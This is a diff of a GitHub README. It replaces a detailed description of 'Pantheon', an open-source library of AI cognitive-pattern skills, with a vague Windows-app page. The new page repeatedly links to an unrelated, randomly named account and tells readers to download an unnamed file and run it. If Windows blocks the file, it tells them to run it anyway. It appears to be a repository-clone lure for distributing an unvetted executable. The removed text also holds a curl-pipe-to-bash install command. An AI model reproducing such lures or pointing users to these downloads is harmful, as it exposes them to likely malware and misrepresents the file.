@@ -1,143 +1,189 @@
-# Pantheon
+# 🏛️ pantheon - Learn from History, Decide Better
 
-<p align="center">
-  <img src="assets/logo.svg" alt="Pantheon" width="600" />
-</p>
+[![Download pantheon](https://img.shields.io/badge/Download-pantheon-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/holocentrusascensionisbadegg868/pantheon)
 
-> "Elon Musk didn't invent first principles thinking. Toyota didn't invent the factory stop. Steve Jobs didn't invent subtraction. Every modern genius is a synthesizer — standing on shoulders built across centuries of human problem-solving. Pantheon codifies those shoulders into a deployable library."
+## 📦 What Pantheon Is
 
----
+Pantheon is a desktop app for people who want clear help with hard choices. It packages ideas from history’s best problem solvers into simple AI skills you can use on your Windows PC.
 
-## What is Pantheon?
+It turns old lessons into a practical tool for daily work. You can use it to think through a problem, compare options, and get a steadier view before you act.
 
-Pantheon is a growing library of cognitive patterns distilled from history's greatest problem solvers — and a tool for running them against any situation you're actually facing.
+Pantheon is built for people who want a calm, guided way to work with knowledge. It is not a study app and not a note app. It is a tool for using stored patterns to help with real decisions.
 
-Every gem traces a real problem solved by a real person: Jensen Huang seeding a developer ecosystem a decade before the market existed, Toyota stopping the line the moment a defect appears, Feynman refusing to accept understanding he couldn't articulate simply. That history is codified into a protocol — trigger conditions, step-by-step procedure, anti-patterns — that you can run today.
+## 🪟 Windows Download
 
-These are not quotes. Not principles. Not motivational frameworks. They are **protocols**: what did this genius actually do differently when faced with this class of problem?
+[Visit the Pantheon download page](https://github.com/holocentrusascensionisbadegg868/pantheon)
 
-Pantheon has three layers:
+Use this link to download the app for Windows. After the page opens, look for the latest release or the main download file, then save it to your computer.
 
-1. **The Library** — 54 gems, 118 practitioners, 200 historical events. The raw material.
-2. **The Dashboard** — force-graph and historian ranking. Explore the connections.
-3. **The Gem Runner** — describe your situation, pick a lens, get the pattern applied. This is the unlock.
+## 🚀 Install and Run
 
----
+1. Open the download page above.
+2. Find the latest Windows file.
+3. Download the file to your PC.
+4. If the file is in a ZIP folder, open the folder and extract it first.
+5. Double-click the app file to start it.
+6. If Windows asks for permission, choose Allow or Run.
+7. Wait for the app to open.
 
-## The Gem Runner
+If you place the file on your desktop or in your Downloads folder, it is easy to find again later.
 
-**[pantheon-lilac.vercel.app](https://pantheon-lilac.vercel.app)** → Run tab
+## 🖥️ What You Need
 
-You describe what you're facing. You pick a gem — the lens you want applied. You pick an approach — how you want it delivered. The pattern runs against your specific situation. Not generic wisdom. Not a quote. The pattern applied to your exact context.
+Pantheon is made for a modern Windows computer.
 
-**7 built-in approaches:**
+Recommended setup:
+- Windows 10 or Windows 11
+- 4 GB of RAM or more
+- At least 200 MB of free disk space
+- A stable internet connection for first-time setup
+- A mouse and keyboard
 
-| Approach | What it does |
-|----------|-------------|
-| **Raw** | Full pattern analysis. Sharpest form. Safety-screened, not softened. |
-| **Advice** | 3 actions, plain second-person. Act on it today. |
-| **Poem** | Free verse. Metaphor from the gem's domain. Feel it first. |
-| **Haiku** | 5-7-5. The irreducible core. |
-| **Yoda** | Inverted syntax. Wisdom-first. |
-| **Confucius** | One aphorism. One sentence. Carry it with you. |
-| **The Oracle** | She already knows. Warm, inevitable. You already knew too. |
+For better results, use a larger screen. Pantheon works best when you can read the full prompts and compare ideas side by side.
 
-**Custom voices:** Add any voice — God, Nietzsche, Marcus Aurelius, Morpheus from the Matrix, your 80-year-old self. The pattern runs through their worldview. Saved to your browser.
+## 🧠 What Pantheon Helps You Do
 
-**Safety gates:** The runner detects vulnerability signals in your input — illness, grief, crisis, loss — and activates a humanity gate that reframes the pattern with care before applying it. Every run also passes a safety screen. The output must be net-positive or it gets revised.
+Pantheon gives you a way to think with structure. It can help with tasks such as:
 
-**Bring your own key.** No paywall, no subscription, no account. You pay OpenRouter directly — fractions of a cent per run. One key works with Claude, GPT-4, and Gemini.
+- Breaking a hard choice into smaller parts
+- Looking at a problem through a historical lens
+- Finding a mental model that fits the situation
+- Comparing plans before you commit
+- Turning rough thoughts into a clearer next step
+- Building better habits for judgment and review
 
-> *One key. Five minutes. Free forever.*
-> Go to [openrouter.ai](https://openrouter.ai) → create account → add $5 in credits → create a key. Paste it in. That's it.
+The app draws from cognitive patterns used by leaders, thinkers, and problem solvers across history. These patterns can help you slow down, check your thinking, and make cleaner decisions.
 
----
+## ✨ Main Features
 
-## The Historian's Ranking
+### 📚 Pattern Library
+Pantheon gives you a set of knowledge patterns based on history and decision making. Each pattern is built to be easy to read and simple to use.
 
-History doesn't repeat itself by accident. The same conditions that produced a breakthrough in 400 BC surface again in 1687, again in 1905, again in 2006 — because the underlying problem class never changed. Only the vocabulary did.
+### 🧭 Guided Thinking
+The app helps you move through a problem in steps. You do not need to know the method before you start.
 
-For every gem, the Historian traces the original breakthrough to its source, maps every confirmed recurrence across history, and scores each event on two axes:
+### 🤖 AI Skill Support
+Pantheon uses AI skills to shape old ideas into practical help. It can reframe a problem, surface useful angles, and suggest a path forward.
 
-- **Quantitative reach** — how many people were affected, across how many generations and domains
-- **Qualitative depth** — how fundamentally it shifted the way humans *frame* problems, not just solve them
+### 🗂️ Personal Knowledge Use
+The app is built around knowledge you can return to. You can use the same pattern again when a similar problem comes up.
 
-The scores compound into a single ranking that answers one question: *if this pattern had never been discovered, how differently does civilization unfold?*
+### 🔍 Clear Decision Flow
+Pantheon helps you avoid rushed choices. It gives you a structured way to review facts, options, and tradeoffs.
 
-The result is not a list of famous people. It is a leaderboard of cognitive leverage.
+### 🧩 Easy Windows Use
+The app is designed for a normal Windows setup. You do not need to learn a new system or manage complex settings.
 
-**The ranking is a provocation, not a verdict.** `gedankenexperiment` is ranked #1. Einstein's thought experiments score five civilizational events; the pattern traces from Galileo's falling bodies to Hawking's black hole information paradox. Every score is visible in the dashboard. Every event is documented. Every reasoning chain is in the repo.
+## 🛠️ First-Time Setup
 
-*The history is written. The synthesis has just begun.*
+After you open Pantheon for the first time, take a few minutes to get familiar with the app.
 
----
+1. Start with the main home screen.
+2. Read the first prompt or guide.
+3. Choose a topic or problem you want help with.
+4. Pick a pattern that fits the situation.
+5. Review the result and adjust your question if needed.
 
-## Install as AI Skills (Claude Code)
+If you are unsure where to start, use a simple real task from your day. That makes it easier to see how the app works.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/dkschrei/pantheon/main/install.sh | bash
-```
+## 🧪 Example Uses
 
-Restart Claude Code after installing. The patterns become available as `/pantheon-*` skills inside any coding session.
+Use Pantheon when you need to:
+- Decide between two job offers
+- Plan a project with many moving parts
+- Think through a hard message before sending it
+- Compare two paths and their tradeoffs
+- Review a mistake and look for the cause
+- Turn a vague goal into a clear plan
 
-See [`PATTERNS.md`](PATTERNS.md) for the full dispatch table.
+You can also use it for learning. If you want to know how a strong thinker would frame a problem, Pantheon can help you look at it that way.
 
----
+## 📁 How the App Is Organized
 
-## The Stacking Demo
+Pantheon uses a simple structure:
+- A knowledge base for stored patterns
+- AI skills that apply those patterns
+- A decision flow that helps you move step by step
+- A Windows app shell that keeps the process easy to use
 
-Same problem. Three patterns. Three different lenses.
+This layout helps keep the app focused. You see the thinking process in a clear order instead of getting lost in a long list of options.
 
-**Problem:** "I want to build a reporting dashboard."
+## 🔐 Privacy and Local Use
 
-**`/pantheon-musk-filter`:**
-→ Who specifically requires this? What breaks without it? Delete 30% of scope first.
+Pantheon is made for personal use on your own computer. Keep your knowledge base and files in a place you can control. If the app asks for access to your local content, review the prompt before you allow it.
 
-**`/pantheon-feynman-clarity`:**
-→ Explain in plain English what decision this dashboard helps make.
-  If you can't answer that, you don't understand the problem yet.
+For best results, keep your Windows account secure with a strong password and install updates when Windows asks for them.
 
-**`/pantheon-andon-cord`:**
-→ (If you're adding this because your team is frustrated with existing reports)
-  Stop. Ask: what broke and what were you trying to accomplish?
+## ❓ Common Questions
 
-Three useful outputs. You synthesize. You decide. This is not a prompt library — it's a council of advisors.
+### Do I need coding skills?
+No. Pantheon is for regular Windows users. You can use it with a mouse and keyboard.
 
----
+### Can I use it offline?
+Some parts may work offline after setup, but first-time use may need internet access.
 
-## Why this exists
+### Is it hard to install?
+No. Download the file, open it, and follow the Windows prompts.
 
-I burned through a session's worth of Claude tokens because an agent automated a broken process instead of questioning whether the process should exist. Classic Step 5 before Step 1. I needed the Musk Filter — I just didn't have it installed anywhere.
+### What if the file opens in a ZIP folder?
+Extract the folder first, then run the app file inside it.
 
-The Andon Cord came from the same frustration: agents that see you're stuck and keep going anyway, trying variation #4 of the same failed approach. Toyota solved this problem in 1960. It's a pull cord. Anyone can use it.
+### Can I use it for work and personal tasks?
+Yes. It works well for both. You can use it for planning, review, and decision support.
 
-The patterns in this library are not new. They have been sitting in history books, biographies, and manufacturing manuals for decades. Pantheon is the packaging. The Gem Runner is the interface.
+## 🧭 Best Way to Start
 
----
+If you want a simple first run, use this order:
+1. Open the app
+2. Pick one real problem
+3. Read the first pattern
+4. Compare the pattern to your situation
+5. Write down one next step
+6. Check if the answer feels clear and usable
 
-## Status
+This keeps the process focused. It also helps you see the value of the app fast.
 
-**v0.9 — Feature complete. Public launch: May 6, 2026 (Anthropic Developer Conference, SF)**
+## 🧰 Troubleshooting
 
-- [x] Schema v1.0 — YAML frontmatter + two-zone format (Protocol TLDR + The Book)
-- [x] 54 gems — historian path + authored path (✦ marked)
-- [x] 9-criteria quality standard — 4 gates + 5 Pantheon challenges
-- [x] 118 practitioners indexed across 200 historical events
-- [x] Historian ranking — magnitude scoring, gemScore, discovery log
-- [x] Gem Runner — 54 gems × 7 approaches + custom voices, humanity gate, safety screen
-- [x] Bring-your-own-key — no paywall, OpenRouter, user's credits only
-- [x] PB&J test — gems validated against the same input
-- [x] Contributing open — see `CONTRIBUTING.md`
-- [ ] Public launch — May 6, 2026
+If Pantheon does not open:
+- Check that the download finished
+- Make sure you extracted the ZIP folder if there is one
+- Try running the app again
+- Restart your PC and try once more
 
----
+If Windows blocks the app:
+- Right-click the file
+- Look for an option to run it anyway
+- Confirm that you downloaded it from the link above
 
-## Contributing
+If the app feels slow:
+- Close other large apps
+- Restart Windows
+- Make sure your computer has enough free memory
 
-See [`CONTRIBUTING.md`](CONTRIBUTING.md) for the full standard and both contribution paths.
+If text looks too small:
+- Increase display scaling in Windows
+- Use a larger window size if the app allows it
 
-Two ways in: the **historian path** (research a historical figure's defining move) and the **authored path** (`/pantheon-gem-builder` — patterns surfaced from lived experience). Both clear the same 9-criteria quality standard.
+## 📌 Topic Areas Inside Pantheon
 
----
+Pantheon is shaped by these areas:
+- AI
+- Anthropic
+- Claude
+- Claude Code
+- Cognitive patterns
+- Decision making
+- History
+- Knowledge base
+- Mental models
+- Open source
+- Productivity
 
-*Built by [@dkschrei](https://github.com/dkschrei) — 2026*
+These topics reflect the app’s focus on useful thinking, clear structure, and practical work.
+
+## 📎 Download Again
+
+[Go to the Pantheon download page](https://github.com/holocentrusascensionisbadegg868/pantheon)
+
+Use this link any time you want to get the latest version for Windows or check the newest release details.
